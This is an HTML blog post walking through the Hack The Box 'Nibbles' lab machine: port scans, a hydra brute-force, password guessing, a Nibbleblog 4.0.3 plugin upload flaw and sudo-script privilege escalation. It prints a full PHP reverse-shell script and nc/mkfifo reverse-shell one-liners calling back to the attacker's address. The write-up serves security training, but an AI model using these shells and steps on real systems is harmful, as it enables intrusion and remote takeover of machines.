@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Nibbles - Hack the box</title>
+
+  
+  
+
+
+
+
+
+  
+  <meta name="author" content="Neal" />
+  <meta name="description" content="Introduction Target: 10.10.10.75(OS: Linux) Kali linux: 10.10.16.44
+Information Enumeration Firstly, detect the open ports:
+nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.75  There are not too many open ports, just 80 and 22. Detect the detailed services of the open ports:
+nmap -sC -sV -oA services 10.10.10.75  Nothing special found. The only clue may be the open port of 80. To be honest, the box with less open ports is easier in general." />
+
+  
+  
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@gohugoio" />
+    <meta name="twitter:title" content="Nibbles - Hack the box" />
+    <meta name="twitter:description" content="Introduction Target: 10.10.10.75(OS: Linux) Kali linux: 10.10.16.44
+Information Enumeration Firstly, detect the open ports:
+nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.75  There are not too many open ports, just 80 and 22. Detect the detailed services of the open ports:
+nmap -sC -sV -oA services 10.10.10.75  Nothing special found. The only clue may be the open port of 80. To be honest, the box with less open ports is easier in general." />
+    <meta name="twitter:image" content="https://neal1991.github.io/img/avatar.jpg" />
+  
+
+  
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="Nibbles - Hack the box" />
+  <meta property="og:description" content="Introduction Target: 10.10.10.75(OS: Linux) Kali linux: 10.10.16.44
+Information Enumeration Firstly, detect the open ports:
+nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.75  There are not too many open ports, just 80 and 22. Detect the detailed services of the open ports:
+nmap -sC -sV -oA services 10.10.10.75  Nothing special found. The only clue may be the open port of 80. To be honest, the box with less open ports is easier in general." />
+  <meta property="og:url" content="https://neal1991.github.io/post/nibbles-hack-the-box/" />
+  <meta property="og:image" content="https://neal1991.github.io/img/avatar.jpg" />
+
+
+
+
+<meta name="generator" content="Hugo 0.37.1" />
+
+
+<link rel="canonical" href="https://neal1991.github.io/post/nibbles-hack-the-box/" />
+<link rel="alternative" href="https://neal1991.github.io/index.xml" title="Neal&#39;s Blog" type="application/atom+xml" />
+
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta name="format-detection" content="telephone=no,email=no,adress=no" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+
+
+<meta name="robots" content="index,follow" />
+<meta name="referrer" content="origin-when-cross-origin" />
+<meta name="google-site-verification" content="_moDmnnBNVLBN1rzNxyGUGdPHE20YgbmrtzLIbxaWFc" />
+<meta name="msvalidate.01" content="22596E34341DD1D17D6022C44647E587" />
+
+
+
+
+
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+<meta name="apple-mobile-web-app-title" content="Neal&#39;s Blog" />
+<meta name="msapplication-tooltip" content="Neal&#39;s Blog" />
+<meta name='msapplication-navbutton-color' content="#5fbf5e" />
+<meta name="msapplication-TileColor" content="#5fbf5e" />
+<meta name="msapplication-TileImage" content="/img/tile-image-windows.png" />
+<link rel="icon" href="https://neal1991.github.io/img/favicon.ico" />
+<link rel="icon" type="image/png" sizes="16x16" href="https://neal1991.github.io/img/favicon-16x16.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="https://neal1991.github.io/img/favicon-32x32.png" />
+<link rel="icon" sizes="192x192" href="https://neal1991.github.io/img/touch-icon-android.png" />
+<link rel="apple-touch-icon" href="https://neal1991.github.io/img/touch-icon-apple.png" />
+<link rel="mask-icon" href="https://neal1991.github.io/img/safari-pinned-tab.svg" color="#5fbf5e" />
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/video.js/6.2.8/alt/video-js-cdn.min.css" />
+
+<link rel="stylesheet" href="https://neal1991.github.io/css/bundle.css" />
+
+
+  
+  <!--[if lt IE 9]>
+    <script src="//cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+    <script src="//cdn.bootcss.com/video.js/6.2.8/ie8/videojs-ie8.min.js"></script>
+  <![endif]-->
+
+<!--[if lte IE 11]>
+    <script src="//cdn.bootcss.com/classlist/1.1.20170427/classList.min.js"></script>
+  <![endif]-->
+
+
+<script src="//cdn.bootcss.com/object-fit-images/3.2.3/ofi.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/smooth-scroll/12.1.4/js/smooth-scroll.polyfills.min.js"></script>
+
+
+</head>
+  <body>
+    
+    <div class="suspension">
+      <a title="Go to top" class="to-top is-hide"><span class="icon icon-up"></span></a>
+      
+        
+        <a title="Go to comments" class="to-comment" href="#disqus_thread"><span class="icon icon-comment"></span></a>
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <img class="avatar" src="https://neal1991.github.io/img/avatar.jpg" alt="Avatar">
+  
+  <h2 class="title">Neal&#39;s Blog</h2>
+  
+  <p class="subtitle">Development &amp; Security</p>
+  <button class="menu-toggle" type="button">
+    <span class="icon icon-menu"></span>
+  </button>
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+            
+            
+            
+              is-active
+            ">
+            <a href="https://neal1991.github.io/">Home</a>
+          </li>
+      
+        <li class="menu-item
+            
+            
+            ">
+            <a href="https://github.com/neal1991">Works</a>
+          </li>
+      
+        <li class="menu-item
+            
+            
+            ">
+            <a href="https://neal1991.github.io/tags/">Tags</a>
+          </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list">
+
+      
+      <li class="social-item">
+        <a href="mailto:bing.ecnu@gmail.com" title="Email"><span class="icon icon-email"></span></a>
+      </li>
+
+      
+      <li class="social-item">
+        <a href="//github.com/neal1991" title="GitHub"><span class="icon icon-github"></span></a>
+      </li>
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <li class="social-item">
+        <a href="https://neal1991.github.io/index.xml"><span class="icon icon-rss" title="RSS"></span></a>
+      </li>
+
+    </ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Nibbles - Hack the box</h1>
+      <p class="post-meta">@Neal · Mar 17, 2019 · 6 min read</p>
+    </header>
+    <article class="post-content">
+
+<p><img src="https://s2.ax1x.com/2019/03/17/Ae0G8g.png" alt="Ae0G8g.png" /></p>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>Target: 10.10.10.75(OS: Linux)
+Kali linux: 10.10.16.44</p>
+
+<h2 id="information-enumeration">Information Enumeration</h2>
+
+<p>Firstly, detect the open ports:</p>
+
+<pre><code>nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.75
+</code></pre>
+
+<p><img src="https://s2.ax1x.com/2019/03/17/Ae19BQ.png" alt="Ae19BQ.png" /></p>
+
+<p>There are not too many open ports, just <code>80</code> and <code>22</code>. Detect the detailed services of the open ports:</p>
+
+<pre><code>nmap -sC -sV -oA services 10.10.10.75
+</code></pre>
+
+<p><img src="https://s2.ax1x.com/2019/03/17/Ae1E90.png" alt="Ae1E90.png" /></p>
+
+<p>Nothing special found. The only clue may be the open port of <code>80</code>. To be honest, the box with less open ports is easier in general.</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<h3 id="http">Http</h3>
+
+<p>Access to <code>http://10.10.10.75</code>, just a web page of <code>hello world</code>.</p>
+
+<p><img src="https://neal1991.github.io/Users/neal/project/htb/Nibbles/hello.png" alt="hello" /></p>
+
+<p>With the first sight, have not found anything special. Open the inspector, a comment can be found. Obviously, <code>nibbleblog</code> is quite important to us. Access to <code>http://10.10.10.75/nibbleblog</code>:</p>
+
+<p><img src="https://neal1991.github.io/Users/neal/project/htb/Nibbles/blog.png" alt="blog" /></p>
+
+<p>It seems to be a blog demo. Try to access to each hyperlink in the web page, find nothing special. Try to use nikto to explore:</p>
+
+<pre><code>nikto -host http://10.10.10.75/nibbleblog/
+</code></pre>
+
+<p><img src="https://s2.ax1x.com/2019/03/17/AeYklt.png" alt="AeYklt.png" /></p>
+
+<p><code>[nibbleblog](http://www.nibbleblog.com/)</code>  is an open source blog system which has been widely used. From the above screenshot, some interesting links can be found. And also try to brute force with <code>gobuster</code>:</p>
+
+<pre><code>gobuster -u http://10.10.10.75/nibbleblog/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+</code></pre>
+
+<p>Similarly, the directory of <code>nibbleblog</code> can be found, just like admin, content, etc. Open the README of the blog:</p>
+
+<p><img src="https://s2.ax1x.com/2019/03/17/AeYynK.png" alt="AeYynK.png" /></p>
+
+<p>The version is <code>4.0.3</code>. Google with <code>nibbleblog 4.0.3 exploit</code>. Find a <a href="https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html">report</a> to talk about the exploit of nibbleblog of <code>4.0.3</code>.</p>
+
+<p><img src="https://s2.ax1x.com/2019/03/17/AeYRtH.png" alt="AeYRtH.png" /></p>
+
+<p>The research report is detailed. But there is a precondition that you have to obtain admin credentials. Access to login page: <code>http://10.10.10.75/nibbleblog/admin.php</code>.</p>
+
+<p><a href="https://imgchr.com/i/AeY5ct"><img src="https://s2.ax1x.com/2019/03/17/AeY5ct.png" alt="AeY5ct.png" /></a></p>
+
+<p>Try the password of <code>123456</code> and <code>admin</code>. Both are not correct. I have even tried to use hydra:</p>
+
+<p><code>hydra -l admin -P /usr/share/wordlist/rockyou.txt -vV -f -t 2 10.10.10.75 http-post-form &quot;/nibbleblog/admin.php:username=^USER^&amp;password=^PASS^:login_error&quot;</code></p>
+
+<p><img src="https://s2.ax1x.com/2019/03/17/AetpuV.png" alt="AetpuV.png" /></p>
+
+<p>The hydra result shows that the password is <code>123456</code>. But it is not correct. I doubt it has something with the blacklist of <code>nibbleblog</code>. Whatever, try to figure out the password. Try <code>nibbles</code>. Wow, we are in. You should try every password as more as possible.</p>
+
+<p>As you have logged in. The above report can be used:</p>
+
+<ol>
+<li>Obtain Admin credentials (for example via Phishing via XSS which can be gained via CSRF, see advisory about CSRF in NibbleBlog 4.0.3)</li>
+<li>Activate My image plugin by visiting <a href="http://10.10.16.44/nibbleblog/admin.php?controller=plugins&amp;action=install&amp;plugin=my_image">http://10.10.16.44/nibbleblog/admin.php?controller=plugins&amp;action=install&amp;plugin=my_image</a></li>
+<li>Upload PHP shell, ignore warnings</li>
+<li>Visit <a href="http://localhost/10.10.16.44/content/private/plugins/my_image/image.php">http://localhost/10.10.16.44/content/private/plugins/my_image/image.php</a>. This is the default name of images uploaded via the plugin.</li>
+</ol>
+
+<p>Upload a reverse shell php file and use nc to listen to port <code>1234</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#a6e22e">set_time_limit</span> (<span style="color:#ae81ff">0</span>);
+$VERSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1.0&#34;</span>;
+$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.10.16.44&#39;</span>;  <span style="color:#75715e">// CHANGE THIS
+</span><span style="color:#75715e"></span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1234</span>;       <span style="color:#75715e">// CHANGE THIS
+</span><span style="color:#75715e"></span>$chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1400</span>;
+$write_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+$error_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+$shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uname -a; w; id; /bin/sh -i&#39;</span>;
+$daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+$debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+<span style="color:#75715e">//
+</span><span style="color:#75715e">// Daemonise ourself if possible to avoid zombies later
+</span><span style="color:#75715e">//
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// pcntl_fork is hardly ever available, but will allow us to daemonise
+</span><span style="color:#75715e">// our php process and avoid zombies.  Worth a try...
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">function_exists</span>(<span style="color:#e6db74">&#39;pcntl_fork&#39;</span>)) {
+    <span style="color:#75715e">// Fork and have the parent process exit
+</span><span style="color:#75715e"></span>    $pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcntl_fork</span>();
+    
+    <span style="color:#66d9ef">if</span> ($pid <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+        <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Can&#39;t fork&#34;</span>);
+        <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
+    }
+    
+    <span style="color:#66d9ef">if</span> ($pid) {
+        <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">0</span>);  <span style="color:#75715e">// Parent exits
+</span><span style="color:#75715e"></span>    }
+
+    <span style="color:#75715e">// Make the current process a session leader
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Will only succeed if we forked
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">posix_setsid</span>() <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+        <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;Error: Can&#39;t setsid()&#34;</span>);
+        <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
+    }
+
+    $daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+} <span style="color:#66d9ef">else</span> {
+    <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span>);
+}
+
+<span style="color:#75715e">// Change to a safe directory
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">chdir</span>(<span style="color:#e6db74">&#34;/&#34;</span>);
+
+<span style="color:#75715e">// Remove any umask we inherited
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">umask</span>(<span style="color:#ae81ff">0</span>);
+
+<span style="color:#75715e">//
+</span><span style="color:#75715e">// Do the reverse shell...
+</span><span style="color:#75715e">//
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// Open reverse connection
+</span><span style="color:#75715e"></span>$sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>($ip, $port, $errno, $errstr, <span style="color:#ae81ff">30</span>);
+<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$sock) {
+    <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$errstr</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">$errno</span><span style="color:#e6db74">)&#34;</span>);
+    <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
+}
+
+<span style="color:#75715e">// Spawn shell process
+</span><span style="color:#75715e"></span>$descriptorspec <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+   <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>),  <span style="color:#75715e">// stdin is a pipe that the child will read from
+</span><span style="color:#75715e"></span>   <span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>),  <span style="color:#75715e">// stdout is a pipe that the child will write to
+</span><span style="color:#75715e"></span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)   <span style="color:#75715e">// stderr is a pipe that the child will write to
+</span><span style="color:#75715e"></span>);
+
+$process <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>($shell, $descriptorspec, $pipes);
+
+<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_resource</span>($process)) {
+    <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Can&#39;t spawn shell&#34;</span>);
+    <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
+}
+
+<span style="color:#75715e">// Set everything to non-blocking
+</span><span style="color:#75715e">// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">0</span>);
+<span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">0</span>);
+<span style="color:#a6e22e">stream_set_blocking</span>($pipes[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>);
+<span style="color:#a6e22e">stream_set_blocking</span>($sock, <span style="color:#ae81ff">0</span>);
+
+<span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;Successfully opened reverse shell to </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">:</span><span style="color:#e6db74">$port</span><span style="color:#e6db74">&#34;</span>);
+
+<span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+    <span style="color:#75715e">// Check for end of TCP connection
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">feof</span>($sock)) {
+        <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Shell connection terminated&#34;</span>);
+        <span style="color:#66d9ef">break</span>;
+    }
+
+    <span style="color:#75715e">// Check for end of STDOUT
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">feof</span>($pipes[<span style="color:#ae81ff">1</span>])) {
+        <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;ERROR: Shell process terminated&#34;</span>);
+        <span style="color:#66d9ef">break</span>;
+    }
+
+    <span style="color:#75715e">// Wait until a command is end down $sock, or some
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// command output is available on STDOUT or STDERR
+</span><span style="color:#75715e"></span>    $read_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>($sock, $pipes[<span style="color:#ae81ff">1</span>], $pipes[<span style="color:#ae81ff">2</span>]);
+    $num_changed_sockets <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream_select</span>($read_a, $write_a, $error_a, <span style="color:#66d9ef">null</span>);
+
+    <span style="color:#75715e">// If we can read from the TCP socket, send
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// data to process&#39;s STDIN
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($sock, $read_a)) {
+        <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;SOCK READ&#34;</span>);
+        $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($sock, $chunk_size);
+        <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;SOCK: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>);
+        <span style="color:#a6e22e">fwrite</span>($pipes[<span style="color:#ae81ff">0</span>], $input);
+    }
+
+    <span style="color:#75715e">// If we can read from the process&#39;s STDOUT
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// send data down tcp connection
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($pipes[<span style="color:#ae81ff">1</span>], $read_a)) {
+        <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDOUT READ&#34;</span>);
+        $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($pipes[<span style="color:#ae81ff">1</span>], $chunk_size);
+        <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDOUT: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>);
+        <span style="color:#a6e22e">fwrite</span>($sock, $input);
+    }
+
+    <span style="color:#75715e">// If we can read from the process&#39;s STDERR
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// send data down tcp connection
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($pipes[<span style="color:#ae81ff">2</span>], $read_a)) {
+        <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDERR READ&#34;</span>);
+        $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($pipes[<span style="color:#ae81ff">2</span>], $chunk_size);
+        <span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDERR: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>);
+        <span style="color:#a6e22e">fwrite</span>($sock, $input);
+    }
+}
+
+<span style="color:#a6e22e">fclose</span>($sock);
+<span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">0</span>]);
+<span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">1</span>]);
+<span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">2</span>]);
+<span style="color:#a6e22e">proc_close</span>($process);
+
+<span style="color:#75715e">// Like print, but does nothing if we&#39;ve daemonised ourself
+</span><span style="color:#75715e">// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#f92672"></span><span style="color:#a6e22e">printit</span> ($string) {
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$daemon) {
+        <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$string\n</span><span style="color:#e6db74">&#34;</span>;
+    }
+}
+
+<span style="color:#75715e">?&gt;</span> 
+</code></pre></div>
+<p>Accomplish the last step, get the user shell!</p>
+
+<p><img src="https://s2.ax1x.com/2019/03/17/AetbKx.png" alt="AetbKx.png" /></p>
+
+<p><img src="https://s2.ax1x.com/2019/03/17/AeNAZ8.png" alt="AeNAZ8.png" /></p>
+
+<h2 id="privilege-escalation">Privilege escalation</h2>
+
+<p>The next step is to get the root shell. Try to check the kernel of the linux:</p>
+
+<p><img src="https://s2.ax1x.com/2019/03/17/AeNuzn.png" alt="AeNuzn.png" /></p>
+
+<p>The kernel seems quite fresh. It may be hard to find the kernel exploit. Try to check the sudo permission of nibbler: <code>sudo -l</code>.</p>
+
+<p><img src="https://s2.ax1x.com/2019/03/17/AeNrdO.png" alt="AeNrdO.png" /></p>
+
+<p>Just as expected, find a file <code>monitor.sh</code> with root permission. Try to read the file with:</p>
+
+<pre><code>cat /home/nibbler/personal/stuff/monitor.sh
+</code></pre>
+
+<p><img src="https://s2.ax1x.com/2019/03/17/AeUA61.png" alt="AeUA61.png" /></p>
+
+<p>The file seems to be a bash script with several tasks. There is no need to understand the usage of the file. We can just modify the script to obtain root shell. So the script should be modified. As it is not convenient to modify the file in the victim machine directly. <code>Nc</code> can be used to send and receive file.</p>
+
+<p>As the sender:</p>
+
+<pre><code>nc -w 3 10.10.16.44 1234 &lt; monitor.sh
+</code></pre>
+
+<p>As the receiver:</p>
+
+<pre><code>nc -lvnp 1234 &gt; monitor.sh
+</code></pre>
+
+<p>You can change the send and receiver as needed. It is basic skills to transfer files between the victim machine and attack machine. <code>Nc</code> is a good tool in linux.</p>
+
+<p>Firstly, <code>nc</code> is used to reverse shell:</p>
+
+<pre><code>nc -e 10.10.16.44 1111
+</code></pre>
+
+<p>Try to set <code>nc</code> listen to <code>1111</code>:</p>
+
+<p><img src="https://s2.ax1x.com/2019/03/17/AeaECQ.png" alt="AeaECQ.png" /></p>
+
+<p>There&rsquo;s a problem with the <code>nc</code> in the victim machine. <code>e</code> option is invalid in the victim machine. May there are some solutions, but I turn to other reverse shell methods right away.</p>
+
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.44 1234 &gt;/tmp/f
+</code></pre>
+
+<p>Send the <code>monitor.sh</code> to the victim machine and make sure to obtain the execution permission:</p>
+
+<pre><code>chmod +x monitor.sh
+</code></pre>
+
+<p>Establish the listen to <code>1234</code> in Kali linux and execute the <code>monitor.sh</code> in the victim machine:</p>
+
+<pre><code>sudo ./monitor.sh
+</code></pre>
+
+<p>Here is the root.</p>
+
+<p><img src="https://s2.ax1x.com/2019/03/17/AewPfg.png" alt="AewPfg.png" /></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>To be honest, the most difficult challenge of this box is to guess the password of admin of <code>nibbleblog</code>. The known vulnerability is not difficult to utilize. To obtain root shell, there are some methods to try. Some specific method cannot be utilized directly. You can try another method. Try harder!</p>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="https://neal1991.github.io/tags/%E5%AE%89%E5%85%A8"><span class="tag">安全</span></a></li>
+        
+          <li><a href="https://neal1991.github.io/tags/hack-the-box"><span class="tag">Hack the Box</span></a></li>
+        
+          <li><a href="https://neal1991.github.io/tags/walkthrough"><span class="tag">Walkthrough</span></a></li>
+        
+          <li><a href="https://neal1991.github.io/tags/linux"><span class="tag">Linux</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.
+      </p>
+    </footer>
+    
+      <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "nealecnu" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+      
+    
+  </section>
+  <footer class="site-footer">
+  <p>© 2017-2019 Neal&#39;s Blog</p>
+  <p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+  
+</footer>
+
+
+
+<script async src="//cdn.bootcss.com/video.js/6.2.8/alt/video.novtt.min.js"></script>
+<script async src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    }
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+<script src="https://neal1991.github.io/js/bundle.js"></script>
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-104405154-2', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+  </body>
+</html>
